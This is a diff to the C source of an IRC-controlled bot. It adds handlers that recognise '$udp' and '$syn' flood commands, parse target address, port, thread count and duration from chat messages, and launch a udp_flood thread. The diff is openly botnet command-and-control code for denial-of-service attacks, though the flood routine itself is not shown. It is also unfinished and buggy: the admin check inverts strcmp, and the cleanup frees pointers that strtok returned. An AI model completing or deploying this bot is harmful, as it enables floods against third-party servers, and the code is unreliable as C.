@@ -24,6 +24,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 #include <limits.h>
 
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
@@ -34,11 +35,14 @@
 #elif defined(__linux__)
 
 #include <sys/socket.h>
+#include <pthread.h>
 // need other headers?
 
 #endif
 
 #include "bot.h"
+
+#define DEFAULT_ARG_SIZE 10
 
 /*
  * function to check if user
@@ -102,7 +106,7 @@ int add_admin (pAccount a, pMessage m) {
  * strcmp and return non-zero if
  * is admin, else return 0
  */
-int is_admin (pAccount a, pMessage m) {
+bool is_admin (pAccount a, pMessage m) {
     int i;
     for (i = 0; i < a->num_admins; i++) {
         if (strcmp (m->n_name, a->admins[i])) {
@@ -111,4 +115,123 @@ int is_admin (pAccount a, pMessage m) {
     }
 
     return FALSE;
+}
+
+/*
+ * function to check if command
+ * is a dos command
+ * return TRUE if it is
+ * else FALSE
+ */
+bool is_dos (char *cmd) {
+    if (strcmp (cmd, "$udp") == 0) {
+        return TRUE;
+    } else if (strcmp (cmd, "$syn") == 0) {
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+static thr_args *new_thr_args (SOCKET s) {
+    thr_args *ta = malloc (sizeof (*ta));
+
+    ta->s = s;
+    ta->contact = NULL;
+    ta->addr = NULL;
+    ta->port = NULL;
+    ta->threads = 0;
+    ta->time = 0;
+
+    return ta;
+}
+
+/*
+ * parse user message from IRC
+ * as arguments to dos
+ * might need to clean up the
+ * code so it looks better
+ */
+int parse_args (SOCKET s, pMessage m) {
+    // array of arguments
+    char **argv = malloc (sizeof (char *)*DEFAULT_ARG_SIZE);
+    if (argv == NULL) {
+        return FALSE;
+    }
+
+    int i = 0, argc;
+    char *token;
+    // extract command
+    token = strtok (m->msg, " ");
+    if (token == NULL) {
+        return FALSE;
+    }
+
+    argv[i++] = strdup (token);
+
+    // store message elements in each argv element
+    for (; i < DEFAULT_ARG_SIZE; i++) {
+        token = strtok (NULL, " ");
+        if (token == NULL) {
+            break;
+        }
+        argv[i] = token;
+        printf ("argv[%d]: %s\n", i, argv[i]);
+    }
+
+    // argument count
+    argc = i;
+
+    int opt;
+    thr_args *ta = new_thr_args (s);
+    ta->contact = m->contact;
+
+    // parse options from message
+    while ((opt = getopt (argc, argv, "v:p:h:t:")) != -1) {
+        switch (opt) {
+            case 'v':
+                ta->addr = optarg;
+                break;
+            case 'p':
+                ta->port = optarg;
+                break;
+            case 'h':
+                ta->threads = atoi (optarg);
+                break;
+            case 't':
+                ta->time = atoi (optarg);
+                break;
+            default:
+            	return FALSE;
+        }
+    }
+
+    // thread flood routine
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
+    // CreateThread goes here
+
+#elif defined(__linux__)
+
+    pthread_t thr;
+    if (pthread_create (&thr, NULL, udp_flood, ta)) {
+        fatal ("Thread");
+    }
+    if (pthread_join (thr, NULL)) {
+        fatal ("Join");
+    }
+
+#endif
+
+    // there is an error here somewhere!!!
+    // free argv malloc
+    for (; i > 0; i--) {
+        if (argv[i] != NULL) {
+            free (argv[i]);
+        }
+    }
+    free (argv);
+    free (ta);
+
+    return TRUE;
 }
